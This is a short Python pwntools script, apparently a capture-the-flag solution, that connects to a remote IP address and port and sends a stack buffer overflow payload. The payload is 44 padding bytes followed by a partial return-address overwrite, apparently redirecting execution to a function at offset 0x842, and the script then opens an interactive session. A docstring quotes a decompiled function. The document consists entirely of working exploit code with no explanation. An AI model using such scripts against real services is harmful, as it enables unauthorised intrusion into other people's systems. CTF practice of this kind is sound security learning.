import pwn

r = pwn.remote("124.16.75.117", 51001)

payload = b"a" * 44 + b"\x37" + b"\x42"

r.sendline(payload)

r.interactive()

"""
int sub_40067d() {
  return puts(s);
}
_sub_40067d	.text	0000000000000842
"""
